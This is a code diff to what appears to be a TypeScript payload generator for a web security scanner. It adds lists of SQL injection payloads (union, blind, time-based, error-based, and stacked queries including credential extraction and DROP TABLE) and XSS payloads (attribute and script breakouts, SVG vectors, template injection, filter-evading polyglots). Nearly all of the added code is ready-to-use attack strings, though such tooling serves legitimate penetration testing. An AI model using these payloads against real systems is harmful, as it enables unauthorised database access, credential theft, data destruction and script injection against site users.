@@ -25,9 +25,34 @@ class SqlPayloadGenerator implements PayloadGenerator {
             payloads.push(base.replace('OR 1=1', '|| 1=1')); // Concatenation style logic
         }
 
-        // 4. Context-Aware Wrappers
+        // 4. Union-based injection
+        payloads.push("' UNION SELECT NULL--");
+        payloads.push("' UNION SELECT NULL,NULL--");
+        payloads.push("' UNION SELECT NULL,NULL,NULL--");
+        payloads.push("1 UNION SELECT username,password FROM users--");
+
+        // 5. Boolean-based blind injection
+        payloads.push("' AND 1=1--");
+        payloads.push("' AND 1=2--");
+        payloads.push("' AND 'a'='a");
+        payloads.push("' AND SUBSTRING(@@version,1,1)='5");
+
+        // 6. Time-based blind injection
+        payloads.push("' AND SLEEP(3)--");
+        payloads.push("'; WAITFOR DELAY '0:0:3'--");
+        payloads.push("' AND (SELECT * FROM (SELECT SLEEP(3))a)--");
+        payloads.push("1; SELECT pg_sleep(3)--");
+
+        // 7. Error-based injection
+        payloads.push("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--");
+        payloads.push("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--");
+
+        // 8. Stacked queries
+        payloads.push("'; SELECT 1--");
+        payloads.push("'; DROP TABLE test--");
+
+        // 9. Context-Aware Wrappers
         if (context === 'json_string') {
-            // Break out of JSON string context if injected into value
             payloads.push(`" ${base} --`);
             payloads.push(`" ${base} , "ignore": "`);
         }
@@ -44,7 +69,6 @@ class XssPayloadGenerator implements PayloadGenerator {
         payloads.push(encodeURIComponent(base));
 
         // 2. Tag Case Variation (WAF bypass)
-        // <script> -> <ScRiPt>
         const mixedCase = base.replace(/script/gi, (match) => {
             return match.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('');
         });
@@ -57,8 +81,36 @@ class XssPayloadGenerator implements PayloadGenerator {
             payloads.push('<body onload=alert(1)>');
         }
 
-        // 4. Polyglots (break out of multiple contexts)
+        // 4. Attribute context breakouts
+        payloads.push('" onmouseover="alert(1)" x="');
+        payloads.push("' onfocus='alert(1)' autofocus='");
+        payloads.push('" autofocus onfocus="alert(1)');
+        payloads.push('" onload="alert(1)');
+
+        // 5. JavaScript context breakouts
+        payloads.push("';alert(1);//");
+        payloads.push("\\';alert(1);//");
+        payloads.push("</script><script>alert(1)</script>");
+        payloads.push("-alert(1)-");
+        payloads.push("'-alert(1)-'");
+
+        // 6. SVG-based XSS
+        payloads.push('<svg><script>alert(1)</script></svg>');
+        payloads.push('<svg onload=alert(1)>');
+        payloads.push('<svg/onload=alert`1`>');
+        payloads.push('<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">');
+
+        // 7. Template literal injection
+        payloads.push('${alert(1)}');
+        payloads.push('{{constructor.constructor("alert(1)")()}}');
+
+        // 8. URL-based vectors
+        payloads.push('javascript:alert(1)');
+        payloads.push('data:text/html,<script>alert(1)</script>');
+
+        // 9. Polyglots (break out of multiple contexts)
         payloads.push('javascript://%250Aalert(1)//"\'></title></textarea>--!><img src=x onerror=alert(1)>');
+        payloads.push('jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//');
 
         return payloads;
     }
